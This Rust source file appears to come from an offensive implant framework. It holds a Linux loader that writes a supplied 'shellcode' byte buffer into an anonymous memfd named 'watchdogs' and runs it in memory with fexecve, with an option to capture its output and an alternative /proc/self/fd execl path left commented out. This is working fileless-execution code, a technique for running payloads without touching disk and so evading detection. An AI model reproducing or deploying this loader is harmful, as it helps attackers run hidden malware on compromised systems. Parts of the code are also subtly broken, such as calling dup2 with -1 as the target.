/*
    use to run elf in memory
*/

use crate::common::memory::MaleficChunk;
use std::ffi::CString;
use std::io::Read;
use std::os::unix::io::{FromRawFd, RawFd};
use libc::{dup2, pipe, STDERR_FILENO, STDOUT_FILENO};

#[cfg(target_os = "linux")]
pub unsafe fn loader(shellcode : Vec<u8>, need_output: bool) -> Result<Vec<u8>, String> {
    let mut result: Vec<u8> = Vec::new();
    // if want to use method execl to run shellcode, set prot as 0
    let fd = unsafe { 
        libc::syscall(libc::SYS_memfd_create, 
        "watchdogs\0".as_ptr() as *const libc::c_char,
        2)
    };

    if fd.is_negative() {
        return Err("memfd_create failed".to_string());
    }

    // unsafe {
    //     let ret = libc::ftruncate64(fd as i32 , shellcode.len() as i64);
    //     if ret.is_negative() {
    //         return;
    //     }
    // }

    let size = shellcode.len();
    let memory = MaleficChunk::new_fd(size, fd as _);
    if memory.is_err() {
        return Err("malloc failed".to_string());
    }
    let memory = memory.unwrap();
    let len = libc::write(fd as i32,
                                 shellcode.as_ptr() as *const libc::c_void, 
                                 memory.get_size());
    if len.is_negative() {
        return Err("write failed".to_string());
    }

    let argv = [CString::new("").unwrap().into_raw()];
    let envp = [CString::new("").unwrap().into_raw()];

    let mut pipefd: [RawFd; 2] = [0;2];
    let mut original_stdout: i32 = -1;
    let mut original_stderr: i32 = -1;
    if need_output {
        if pipe(pipefd.as_mut_ptr()) == -1 {
            return Err("Failed to create pipe".to_string());
        }
        original_stdout = dup2(STDOUT_FILENO, -1) ;
        original_stderr = dup2(STDERR_FILENO, -1);
        if original_stdout == -1 || original_stderr == -1 {
            return Err("Failed to save original stdout/stderr".to_string());
        }
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        libc::close(pipefd[1]);
    }

    // method 1
    let ret = libc::fexecve(fd as i32, argv.as_ptr() as *const *const i8, envp.as_ptr() as *const *const i8);

    // method 2
    // let command_path  = format!("/proc/self/fd/{}", fd); 
    // let ret = libc::execl(command_path.to_string().as_ptr() as *const i8, std::ptr::null_mut());

    if ret.is_negative() {
        dup2(original_stdout, STDOUT_FILENO);
        dup2(original_stderr, STDERR_FILENO);
        libc::close(original_stdout);
        libc::close(original_stderr);
        return Err("fexecve failed".to_string());
    }

    if need_output {
        dup2(original_stdout, STDOUT_FILENO);
        dup2(original_stderr, STDERR_FILENO);
        libc::close(original_stdout);
        libc::close(original_stderr);
        let mut output = String::new();
        let mut reader = std::io::BufReader::new(std::fs::File::from_raw_fd(pipefd[0]));
        let _ = reader.read_to_string(&mut output);
        result.extend(output.into_bytes());
    }

    libc::close(fd as i32);
    Ok(result)
}